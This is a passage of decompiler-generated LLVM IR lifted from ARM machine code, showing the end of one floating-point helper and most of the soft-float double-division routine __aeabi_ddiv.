  %tmp22 = icmp slt i32 %v6_305a8, 0
  %v4_305b8 = zext i1 %tmp22 to i32
  %v5_305b8 = add i32 %v8_305b0, %v4_305b8
  %v6_305b8 = icmp ult i32 %v5_305b8, %v8_305b0
  %v2_305bc = zext i1 %v6_305b8 to i32
  %v3_305bc = or i32 %v2_305bc, %v1_305b4
  store i32 %v3_305bc, i32* @r1, align 4
  %v9_305bc = add nsw i32 %v3_305bc, %v2_305bc
  %v10_305bc = sub i32 0, %v1_305b0
  %v11_305bc = and i32 %v9_305bc, %v10_305bc
  %v12_305bc = icmp slt i32 %v11_305bc, 0
  store i1 %v12_305bc, i1* @cpsr_v, align 1
  %v3_305c0 = mul i32 %v6_305a8, 2
  %v4_305c0 = or i32 %v3_305c0, %tmp7
  %v5_305c0 = icmp slt i32 %v4_305c0, 0
  store i1 %v5_305c0, i1* @cpsr_n, align 1
  %v6_305c0 = icmp eq i32 %v4_305c0, 0
  store i1 %v6_305c0, i1* @cpsr_z, align 1
  br i1 %v6_305c0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_305a0
  %tmp23 = sext i1 %tmp22 to i32
  %v6_305c4 = add nsw i32 %tmp23, -1
  %v7_305c4 = and i32 %v5_305b8, %v6_305c4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_305a0, %bb15
  %v1_305cc = phi i32 [ %v5_305b8, %dec_label_pc_305a0 ], [ %v7_305c4, %bb15 ]
  %v2_305c8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_305c8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_305cc

dec_label_pc_305d0:                               ; preds = %.thread1
  %v1_305d0 = sub i32 32, %v2_3055c
  %v1_305d4 = load i32, i32* @r0, align 4
  %v7_305d4 = shl i32 %v1_305d4, %v1_305d0
  %v8_305d4 = or i32 %v7_305d4, %tmp7
  %v6_305d8 = lshr i32 %v1_305d4, %v2_3055c
  %v1_305dc = load i32, i32* @r1, align 4
  %v7_305dc = shl i32 %v1_305dc, %v1_305d0
  %v8_305dc = or i32 %v7_305dc, %v6_305d8
  %v6_305e0 = lshr i32 %v1_305dc, %v2_3055c
  %v1_305e4 = and i32 %v1_305dc, -2147483648
  store i32 %v1_305e4, i32* @r1, align 4
  %v7_305e8 = lshr i32 %v1_305e4, %v2_3055c
  %v8_305e8 = sub i32 -1, %v7_305e8
  %v9_305e8 = and i32 %v6_305e0, %v8_305e8
  %tmp24 = icmp slt i32 %v8_305dc, 0
  %v4_305ec = zext i1 %tmp24 to i32
  %v5_305ec = add i32 %v4_305ec, %v9_305e8
  %v3_305f0 = mul i32 %v8_305dc, 2
  %v4_305f0 = or i32 %v8_305d4, %v3_305f0
  %v5_305f0 = icmp slt i32 %v4_305f0, 0
  store i1 %v5_305f0, i1* @cpsr_n, align 1
  %v6_305f0 = icmp eq i32 %v4_305f0, 0
  store i1 %v6_305f0, i1* @cpsr_z, align 1
  br i1 %v6_305f0, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_305d0
  %tmp25 = sext i1 %tmp24 to i32
  %v6_305f4 = add nsw i32 %tmp25, -1
  %v7_305f4 = and i32 %v5_305ec, %v6_305f4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_305d0, %bb17
  %v1_305fc = phi i32 [ %v5_305ec, %dec_label_pc_305d0 ], [ %v7_305f4, %bb17 ]
  %v2_305f8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_305f8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_305fc

dec_label_pc_306bc:                               ; preds = %dec_label_pc_30540
  %v0_306bc = load i32, i32* @r1, align 4
  %v1_306bc = and i32 %v0_306bc, -2147483648
  %v1_306c4 = or i32 %v1_306bc, 2146435072
  store i32 %v1_306c4, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_305ec, { 1, 0 }
  uselistorder i32 %v5_305b8, { 1, 0, 2 }
  uselistorder i32 %v8_305b0, { 1, 0 }
  uselistorder i32 %v1_305a0, { 1, 0 }
  uselistorder i32 %v5_30588, { 1, 0 }
  uselistorder i32 %v1_3057c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_30570, { 1, 0 }
  uselistorder i32 %v2_3055c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_30558, { 1, 0 }
  uselistorder i32 %v4_30544, { 1, 2, 0 }
  uselistorder i32 %v0_30544, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 -32, { 6, 5, 7, 9, 10, 11, 14, 15, 0, 12, 2, 13, 3, 8, 4, 1, 16 }
  uselistorder i32 54, { 3, 0, 1, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_306d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_306d4:
  %v1_306d8 = or i32 %arg1, 2146959360
  store i32 %v1_306d8, i32* @r1, align 4
  %v1_306e0 = load i32, i32* @r0, align 4
  ret i32 %v1_306e0
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_306e4 = load i32, i32* @r4, align 4
  store i32 %v3_306e4, i32* %stack_var_-16, align 4
  %v6_306e4 = load i32, i32* @r5, align 4
  %v9_306e4 = load i32, i32* @r6, align 4
  %v12_306e4 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_306f0 = load i32, i32* @r1, align 4
  %v4_306f0 = udiv i32 %v1_306f0, 1048576
  %v5_306f0 = urem i32 %v4_306f0, 2048
  store i32 %v5_306f0, i32* @r4, align 4
  %v6_306f0 = icmp eq i32 %v5_306f0, 0
  br i1 %v6_306f0, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_306f4 = udiv i32 %arg4, 1048576
  %v6_306f4 = urem i32 %v5_306f4, 2048
  store i32 %v6_306f4, i32* %r5.global-to-local, align 4
  %v7_306f4 = icmp eq i32 %v6_306f4, 0
  br i1 %v7_306f4, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_30880

bb90:                                             ; preds = %bb
  %v5_306f8 = icmp eq i32 %v5_306f0, 2047
  br i1 %v5_306f8, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_306f4, %bb90 ]
  br label %dec_label_pc_30880

bb91:                                             ; preds = %bb90
  %v5_306fc = icmp eq i32 %v6_306f4, 2047
  br i1 %v5_306fc, label %dec_label_pc_30880, label %dec_label_pc_30704

dec_label_pc_30704:                               ; preds = %bb91
  %v2_30704 = sub nsw i32 %v5_306f0, %v6_306f4
  store i32 %v2_30704, i32* %r4.global-to-local, align 4
  %v2_30708 = xor i32 %v1_306f0, %arg4
  %v4_3070c = mul i32 %arg4, 4096
  %v5_3070c = or i32 %v4_3070c, %arg3
  store i32 %v5_3070c, i32* %r5.global-to-local, align 4
  %v7_3070c = icmp eq i32 %v5_3070c, 0
  %v3_30710 = mul i32 %v1_306f0, 4096
  store i32 %v3_30710, i32* %r1.global-to-local, align 4
  br i1 %v7_3070c, label %dec_label_pc_3084c, label %dec_label_pc_30718

dec_label_pc_30718:                               ; preds = %dec_label_pc_30704
  %tmp92 = mul i32 %arg4, 256
  %v4_30720 = and i32 %tmp92, 268435200
  %v4_30724 = udiv i32 %arg3, 16777216
  %v5_30720 = or i32 %v4_30724, %v4_30720
  %v5_30724 = or i32 %v5_30720, 268435456
  store i32 %v5_30724, i32* %r3.global-to-local, align 4
  %v3_30728 = mul i32 %arg3, 256
  store i32 %v3_30728, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_306f0, 256
  %v4_3072c = and i32 %tmp93, 268435200
  %v1_30730 = load i32, i32* @r0, align 4
  %v4_30730 = udiv i32 %v1_30730, 16777216
  %v5_3072c = or i32 %v4_3072c, %v4_30730
  %v5_30730 = or i32 %v5_3072c, 268435456
  store i32 %v5_30730, i32* %r5.global-to-local, align 4
  %v3_30734 = mul i32 %v1_30730, 256
  store i32 %v3_30734, i32* %r6.global-to-local, align 4
  %v1_30738 = and i32 %v2_30708, -2147483648
  store i32 %v1_30738, i32* %r1.global-to-local, align 4
  %v3_3073c = icmp uge i32 %v5_30730, %v5_30724
  %v9_3073c = icmp eq i32 %v5_30730, %v5_30724
  br i1 %v9_3073c, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_30718
  %v4_30740 = icmp uge i32 %v3_30734, %v3_30728
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_30718, %bb94
  %v1_30744 = phi i1 [ %v3_3073c, %dec_label_pc_30718 ], [ %v4_30740, %bb94 ]
  %v2_30744 = add nsw i32 %v2_30704, 253
  %v3_30744 = zext i1 %v1_30744 to i32
  %v4_30744 = add nsw i32 %v2_30744, %v3_30744
  %v8_30744 = icmp ule i32 %v4_30744, %v2_30704
  %v9_30744 = icmp ugt i32 %v2_30704, -254
  %v10_30744 = select i1 %v1_30744, i1 %v8_30744, i1 %v9_30744
  %v1_30748 = add nsw i32 %v4_30744, 768
  store i32 %v1_30748, i32* %r4.global-to-local, align 4
  br i1 %v10_30744, label %dec_label_pc_30758, label %dec_label_pc_30750

dec_label_pc_30750:                               ; preds = %bb95
  %v3_30750 = udiv i32 %v5_30724, 2
  store i32 %v3_30750, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_30758

dec_label_pc_30758:                               ; preds = %bb95, %dec_label_pc_30750
  %v0_30760 = phi i32 [ %v5_30724, %bb95 ], [ %v3_30750, %dec_label_pc_30750 ]
  %v0_30764 = phi i32 [ %v3_30728, %bb95 ], [ 0, %dec_label_pc_30750 ]
  %v2_30758 = sub i32 %v3_30734, %v0_30764
  store i32 %v2_30758, i32* %r6.global-to-local, align 4
  %v3_30758 = icmp uge i32 %v3_30734, %v0_30764
  %v3_3075c = icmp eq i1 %v3_30758, false
  %v4_3075c = sub nsw i32 %v5_30730, %v0_30760
  %v6_3075c = sext i1 %v3_3075c to i32
  %v7_3075c = add nsw i32 %v6_3075c, %v4_3075c
  store i32 %v7_3075c, i32* %r5.global-to-local, align 4
  %v3_30760 = udiv i32 %v0_30760, 2
  store i32 %v3_30760, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_30770.outer

dec_label_pc_30770.outer:                         ; preds = %dec_label_pc_30808, %dec_label_pc_30758
  %v1_3081c.ph = phi i32 [ %v2_30808, %dec_label_pc_30808 ], [ %v1_30738, %dec_label_pc_30758 ]
  %v0_30774.ph = phi i32 [ %v5_307e4, %dec_label_pc_30808 ], [ %v7_3075c, %dec_label_pc_30758 ]
  %v1_30778.ph = phi i32 [ %v3_307e8, %dec_label_pc_30808 ], [ %v2_30758, %dec_label_pc_30758 ]
  %v5_307f017.ph = phi i32 [ %v5_307f0, %dec_label_pc_30808 ], [ %v3_30760, %dec_label_pc_30758 ]
  %v3_307f413.ph = phi i32 [ %v3_307f4, %dec_label_pc_30808 ], [ 0, %dec_label_pc_30758 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_30808 ], [ 1048576, %dec_label_pc_30758 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_30808 ], [ 524288, %dec_label_pc_30758 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_30770

dec_label_pc_30770:                               ; preds = %dec_label_pc_30770.outer, %dec_label_pc_307e0
  %v1_307d459 = phi i32 [ %v2_3081c, %dec_label_pc_307e0 ], [ %storemerge133, %dec_label_pc_30770.outer ]
  %v1_30780 = phi i32 [ %v1_3078032, %dec_label_pc_307e0 ], [ %storemerge133, %dec_label_pc_30770.outer ]
  %v1_3079c41 = phi i32 [ %v1_3079c43, %dec_label_pc_307e0 ], [ %storemerge133, %dec_label_pc_30770.outer ]
  %v1_307b850 = phi i32 [ %v1_307b852, %dec_label_pc_307e0 ], [ %storemerge133, %dec_label_pc_30770.outer ]
  %v0_307f8 = phi i32 [ %v3_307f8, %dec_label_pc_307e0 ], [ %storemerge, %dec_label_pc_30770.outer ]
  %v0_30774 = phi i32 [ %v5_307e4, %dec_label_pc_307e0 ], [ %v0_30774.ph, %dec_label_pc_30770.outer ]
  %v1_30778 = phi i32 [ %v3_307e8, %dec_label_pc_307e0 ], [ %v1_30778.ph, %dec_label_pc_30770.outer ]
  %v5_307f017 = phi i32 [ %v5_307f0, %dec_label_pc_307e0 ], [ %v5_307f017.ph, %dec_label_pc_30770.outer ]
  %v3_307f413 = phi i32 [ %v3_307f4, %dec_label_pc_307e0 ], [ %v3_307f413.ph, %dec_label_pc_30770.outer ]
  %v3_30770 = icmp uge i32 %v1_30778, %v3_307f413
  %v3_30774 = icmp eq i1 %v3_30770, false
  %v4_30774 = sub i32 %v0_30774, %v5_307f017
  %v6_30774 = sext i1 %v3_30774 to i32
  %v7_30774 = add i32 %v6_30774, %v4_30774
  %v8_30774 = zext i1 %v3_30774 to i32
  %v9_30774 = sub i32 %v7_30774, %v8_30774
  %v10_30774 = icmp ult i32 %v0_30774, %v9_30774
  %v11_30774 = icmp ne i32 %v5_307f017, -1
  %v12_30774 = or i1 %v11_30774, %v10_30774
  %v13_30774 = icmp ult i32 %v0_30774, %v5_307f017
  %v14_30774 = select i1 %v3_30774, i1 %v12_30774, i1 %v13_30774
  br i1 %v14_30774, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_30770
  %v3_30778 = sub i32 %v1_30778, %v3_307f413
  store i32 %v3_30778, i32* %r6.global-to-local, align 4
  store i32 %v7_30774, i32* %r5.global-to-local, align 4
  %v3_30780 = or i32 %v1_30780, %v0_307f8
  store i32 %v3_30780, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_30770, %bb96
  %v1_307d458 = phi i32 [ %v1_307d459, %dec_label_pc_30770 ], [ %v3_30780, %bb96 ]
  %v1_3078035 = phi i32 [ %v1_30780, %dec_label_pc_30770 ], [ %v3_30780, %bb96 ]
  %v1_3079c = phi i32 [ %v1_3079c41, %dec_label_pc_30770 ], [ %v3_30780, %bb96 ]
  %v1_307b849 = phi i32 [ %v1_307b850, %dec_label_pc_30770 ], [ %v3_30780, %bb96 ]
  %v0_30790 = phi i32 [ %v0_30774, %dec_label_pc_30770 ], [ %v7_30774, %bb96 ]
  %v1_30794 = phi i32 [ %v1_30778, %dec_label_pc_30770 ], [ %v3_30778, %bb96 ]
  %v1_30784 = urem i32 %v5_307f017, 2
  %v2_30784 = icmp ne i32 %v1_30784, 0
  %v3_30784 = udiv i32 %v5_307f017, 2
  %v3_30788 = zext i1 %v2_30784 to i32
  %v6_30788 = zext i32 %v3_307f413 to i64
  %v7_30788 = sub i32 33, %v3_307f413
  %v8_30788 = zext i32 %v7_30788 to i64
  %v9_30788 = shl i64 %v6_30788, %v8_30788
  %v10_30788 = sub i32 32, %v3_307f413
  %v11_30788 = shl i32 %v3_30788, %v10_30788
  %v12_30788 = zext i32 %v11_30788 to i64
  %v14_30788 = or i64 %v12_30788, %v9_30788
  %v15_30788 = trunc i64 %v14_30788 to i32
  %v3_3078c = icmp uge i32 %v1_30794, %v15_30788
  %v3_30790 = icmp eq i1 %v3_3078c, false
  %v4_30790 = sub i32 %v0_30790, %v3_30784
  %v6_30790 = sext i1 %v3_30790 to i32
  %v7_30790 = add i32 %v6_30790, %v4_30790
  %v13_30790 = icmp ult i32 %v0_30790, %v3_30784
  %v14_30790 = or i1 %v13_30790, %v3_30790
  br i1 %v14_30790, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_30794 = sub i32 %v1_30794, %v15_30788
  store i32 %v3_30794, i32* %r6.global-to-local, align 4
  store i32 %v7_30790, i32* %r5.global-to-local, align 4
  %v5_3079c = udiv i32 %v0_307f8, 2
  %v6_3079c = or i32 %v1_3079c, %v5_3079c
  store i32 %v6_3079c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_307d457 = phi i32 [ %v1_307d458, %.thread4 ], [ %v6_3079c, %bb97 ]
  %v1_3078034 = phi i32 [ %v1_3078035, %.thread4 ], [ %v6_3079c, %bb97 ]
  %v1_3079c45 = phi i32 [ %v1_3079c, %.thread4 ], [ %v6_3079c, %bb97 ]
  %v1_307b8 = phi i32 [ %v1_307b849, %.thread4 ], [ %v6_3079c, %bb97 ]
  %v0_307ac = phi i32 [ %v0_30790, %.thread4 ], [ %v7_30790, %bb97 ]
  %v1_307b0 = phi i32 [ %v1_30794, %.thread4 ], [ %v3_30794, %bb97 ]
  %v1_307a0 = urem i32 %v3_30784, 2
  %v2_307a0 = icmp ne i32 %v1_307a0, 0
  %v3_307a0 = udiv i32 %v5_307f017, 4
  %v3_307a4 = zext i1 %v2_307a0 to i32
  %v6_307a4 = and i64 %v14_30788, 4294967295
  %v7_307a4 = sub i32 33, %v15_30788
  %v8_307a4 = zext i32 %v7_307a4 to i64
  %v9_307a4 = shl i64 %v6_307a4, %v8_307a4
  %v10_307a4 = sub i32 32, %v15_30788
  %v11_307a4 = shl i32 %v3_307a4, %v10_307a4
  %v12_307a4 = zext i32 %v11_307a4 to i64
  %v14_307a4 = or i64 %v12_307a4, %v9_307a4
  %v15_307a4 = trunc i64 %v14_307a4 to i32
  %v3_307a8 = icmp uge i32 %v1_307b0, %v15_307a4
  %v3_307ac = icmp eq i1 %v3_307a8, false
  %v4_307ac = sub i32 %v0_307ac, %v3_307a0
  %v6_307ac = sext i1 %v3_307ac to i32
  %v7_307ac = add i32 %v6_307ac, %v4_307ac
  %v13_307ac = icmp ult i32 %v0_307ac, %v3_307a0
  %v14_307ac = or i1 %v13_307ac, %v3_307ac
  br i1 %v14_307ac, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_307b0 = sub i32 %v1_307b0, %v15_307a4
  store i32 %v3_307b0, i32* %r6.global-to-local, align 4
  store i32 %v7_307ac, i32* %r5.global-to-local, align 4
  %v5_307b8 = udiv i32 %v0_307f8, 4
  %v6_307b8 = or i32 %v1_307b8, %v5_307b8
  store i32 %v6_307b8, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_307d4 = phi i32 [ %v1_307d457, %.thread6 ], [ %v6_307b8, %bb98 ]
  %v1_3078033 = phi i32 [ %v1_3078034, %.thread6 ], [ %v6_307b8, %bb98 ]
  %v1_3079c44 = phi i32 [ %v1_3079c45, %.thread6 ], [ %v6_307b8, %bb98 ]
  %v1_307b853 = phi i32 [ %v1_307b8, %.thread6 ], [ %v6_307b8, %bb98 ]
  %v0_307c8 = phi i32 [ %v0_307ac, %.thread6 ], [ %v7_307ac, %bb98 ]
  %v1_307cc = phi i32 [ %v1_307b0, %.thread6 ], [ %v3_307b0, %bb98 ]
  %v1_307bc = urem i32 %v3_307a0, 2
  %v2_307bc = icmp ne i32 %v1_307bc, 0
  %v3_307bc = udiv i32 %v5_307f017, 8
  %v3_307c0 = zext i1 %v2_307bc to i32
  %v6_307c0 = and i64 %v14_307a4, 4294967295
  %v7_307c0 = sub i32 33, %v15_307a4
  %v8_307c0 = zext i32 %v7_307c0 to i64
  %v9_307c0 = shl i64 %v6_307c0, %v8_307c0
  %v10_307c0 = sub i32 32, %v15_307a4
  %v11_307c0 = shl i32 %v3_307c0, %v10_307c0
  %v12_307c0 = zext i32 %v11_307c0 to i64
  %v14_307c0 = or i64 %v12_307c0, %v9_307c0
  %v15_307c0 = trunc i64 %v14_307c0 to i32
  %v3_307c4 = icmp uge i32 %v1_307cc, %v15_307c0
  %v3_307c8 = icmp eq i1 %v3_307c4, false
  %v4_307c8 = sub i32 %v0_307c8, %v3_307bc
  %v6_307c8 = sext i1 %v3_307c8 to i32
  %v7_307c8 = add i32 %v6_307c8, %v4_307c8
  %v13_307c8 = icmp ult i32 %v0_307c8, %v3_307bc
  %v14_307c8 = or i1 %v13_307c8, %v3_307c8
  br i1 %v14_307c8, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_307cc = sub i32 %v1_307cc, %v15_307c0
  store i32 %v3_307cc, i32* %r6.global-to-local, align 4
  store i32 %v7_307c8, i32* %r5.global-to-local, align 4
  %v5_307d4 = udiv i32 %v0_307f8, 8
  %v6_307d4 = or i32 %v1_307d4, %v5_307d4
  store i32 %v6_307d4, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_307e4 = phi i32 [ %v1_307cc, %.thread8 ], [ %v3_307cc, %bb100 ]
  %v0_307e0 = phi i32 [ %v0_307c8, %.thread8 ], [ %v7_307c8, %bb100 ]
  %v2_3081c = phi i32 [ %v1_307d4, %.thread8 ], [ %v6_307d4, %bb100 ]
  %v1_3078032 = phi i32 [ %v1_3078033, %.thread8 ], [ %v6_307d4, %bb100 ]
  %v1_3079c43 = phi i32 [ %v1_3079c44, %.thread8 ], [ %v6_307d4, %bb100 ]
  %v1_307b852 = phi i32 [ %v1_307b853, %.thread8 ], [ %v6_307d4, %bb100 ]
  %v2_307d8 = or i32 %v0_307e0, %v1_307e4
  %v4_307d8 = icmp eq i32 %v2_307d8, 0
  br i1 %v4_307d8, label %dec_label_pc_30818, label %dec_label_pc_307e0

dec_label_pc_307e0:                               ; preds = %.thread10
  %v3_307e0 = mul i32 %v0_307e0, 16
  %v4_307e4 = udiv i32 %v1_307e4, 268435456
  %v5_307e4 = or i32 %v3_307e0, %v4_307e4
  store i32 %v5_307e4, i32* %r5.global-to-local, align 4
  %v3_307e8 = mul i32 %v1_307e4, 16
  store i32 %v3_307e8, i32* %r6.global-to-local, align 4
  %v3_307ec = mul nuw i32 %v3_307bc, 8
  %v4_307f0 = udiv i32 %v15_307c0, 536870912
  %v5_307f0 = or i32 %v4_307f0, %v3_307ec
  %v3_307f4 = mul i32 %v15_307c0, 8
  %v3_307f8 = udiv i32 %v0_307f8, 16
  store i32 %v3_307f8, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_307f8, 16
  br i1 %tmp, label %dec_label_pc_30800, label %dec_label_pc_30770

dec_label_pc_30800:                               ; preds = %dec_label_pc_307e0
  %v1_30800 = and i32 %v1_3081c.ph, 1048576
  %v2_30800 = icmp eq i32 %v1_30800, 0
  br i1 %v2_30800, label %dec_label_pc_30808, label %.thread11.loopexit

dec_label_pc_30808:                               ; preds = %dec_label_pc_30800
  %v2_30808 = or i32 %v2_3081c, %v1_3081c.ph
  store i32 %v2_30808, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_30770.outer

dec_label_pc_30818:                               ; preds = %.thread10
  store i32 %v15_307c0, i32* %r2.global-to-local, align 4
  store i32 %v3_307bc, i32* %r3.global-to-local, align 4
  %v1_30818 = and i32 %v1_3081c.ph, 1048576
  %v2_30818 = icmp eq i32 %v1_30818, 0
  br i1 %v2_30818, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_30818
  %v3_3081c = or i32 %v2_3081c, %v1_3081c.ph
  store i32 %v3_3081c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_30800
  store i32 %v3_307f4, i32* %r2.global-to-local, align 4
  store i32 %v5_307f0, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_30818, %bb101
  %v1_30824 = add nsw i32 %v4_30744, 515
  store i32 %v1_30824, i32* %ip.global-to-local, align 4
  %v2_30824 = icmp ugt i32 %v1_30748, 252
  %v7_30824 = icmp eq i32 %v1_30748, 253
  %v2_30828 = xor i1 %v7_30824, true
  %v3_30828 = and i1 %v2_30824, %v2_30828
  br i1 %v3_30828, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_30828 = icmp ugt i32 %v1_30824, 1791
  %v11_30828 = icmp eq i32 %v1_30824, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_3082c = phi i1 [ %v7_30824, %.thread11 ], [ %v11_30828, %bb102 ]
  %v0_3082c = phi i1 [ %v2_30824, %.thread11 ], [ %v6_30828, %bb102 ]
  %v2_3082c = xor i1 %v1_3082c, true
  %v3_3082c = and i1 %v0_3082c, %v2_3082c
  call void @__pseudo_cond_branch(i1 %v3_3082c, i32 ptrtoint (i32* @global_var_30540.3620 to i32))
  %v0_30830 = load i32, i32* %r5.global-to-local, align 4
  %v1_30830 = load i32, i32* %r3.global-to-local, align 4
  %v2_30830 = sub i32 %v0_30830, %v1_30830
  store i32 %v2_30830, i32* %ip.global-to-local, align 4
  %v3_30830 = icmp uge i32 %v0_30830, %v1_30830
  %v9_30830 = icmp eq i32 %v0_30830, %v1_30830
  br i1 %v9_30830, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_30834 = load i32, i32* %r6.global-to-local, align 4
  %v2_30834 = load i32, i32* %r2.global-to-local, align 4
  %v3_30834 = sub i32 %v1_30834, %v2_30834
  store i32 %v3_30834, i32* %ip.global-to-local, align 4
  %v4_30834 = icmp uge i32 %v1_30834, %v2_30834
  %v10_30834 = icmp eq i32 %v1_30834, %v2_30834
  br i1 %v10_30834, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_30838 = load i32, i32* %r0.global-to-local, align 4
  %v2_30838 = urem i32 %v1_30838, 2
  %v3_30838 = icmp ne i32 %v2_30838, 0
  %v4_30838 = udiv i32 %v1_30838, 2
  store i32 %v4_30838, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_3083c = phi i1 [ %v3_30830, %bb103 ], [ %v4_30834, %bb104 ], [ %v3_30838, %bb105 ]
  %v0_3083c = load i32, i32* %r0.global-to-local, align 4
  %v2_3083c = zext i1 %v1_3083c to i32
  %v3_3083c = add i32 %v2_3083c, %v0_3083c
  store i32 %v3_3083c, i32* %r0.global-to-local, align 4
  %v0_30840 = load i32, i32* %r1.global-to-local, align 4
  %v1_30840 = load i32, i32* %r4.global-to-local, align 4
  %v2_30840 = and i32 %v1_30840, 4096
  %v3_30840 = icmp ne i32 %v2_30840, 0
  %v4_30840 = mul i32 %v1_30840, 1048576
  %v6_30840 = add i32 %v4_30840, %v0_30840
  %v7_30840 = zext i1 %v3_30840 to i32
  %v8_30840 = add i32 %v7_30840, %v6_30840
  store i32 %v8_30840, i32* %r1.global-to-local, align 4
  %v2_30844 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_30844, i32* %r4.global-to-local, align 4
  store i32 %v6_306e4, i32* %r5.global-to-local, align 4
  store i32 %v9_306e4, i32* %r6.global-to-local, align 4
  ret i32 %v3_3083c

dec_label_pc_3084c:                               ; preds = %dec_label_pc_30704
  %v1_3084c = and i32 %v2_30708, -2147483648
  %v4_30850 = urem i32 %v1_306f0, 1048576
  %v5_30850 = or i32 %v1_3084c, %v4_30850
  store i32 %v5_30850, i32* %r1.global-to-local, align 4
  %v6_30854 = add nsw i32 %v2_30704, 1023
  store i32 %v6_30854, i32* %r4.global-to-local, align 4
  %v8_30854 = sub nsw i32 0, %v2_30704
  %v9_30854 = and i32 %v6_30854, %v8_30854
  %v11_30854 = icmp slt i32 %v2_30704, -1023
  %v12_30854 = icmp eq i32 %v6_30854, 0
  %v7_30858 = icmp sgt i32 %v2_30704, -1023
  br i1 %v7_30858, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_3084c
  %v10_30858 = sub nsw i32 1024, %v2_30704
  store i32 %v10_30858, i32* %r5.global-to-local, align 4
  %v14_30858 = and i32 %v10_30858, %v6_30854
  %v16_30858 = icmp slt i32 %v10_30858, 0
  %v17_30858 = icmp eq i32 %v6_30854, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_3084c, %bb106
  %v3_30864.in = phi i32 [ %v9_30854, %dec_label_pc_3084c ], [ %v14_30858, %bb106 ]
  %v2_30864 = phi i1 [ %v11_30854, %dec_label_pc_3084c ], [ %v16_30858, %bb106 ]
  %v1_30864 = phi i1 [ %v12_30854, %dec_label_pc_3084c ], [ %v17_30858, %bb106 ]
  %v3_30864 = icmp slt i32 %v3_30864.in, 0
  %v3_3085c = xor i1 %v3_30864, %v2_30864
  %v4_3085c = or i1 %v1_30864, %v3_3085c
  br i1 %v4_3085c, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
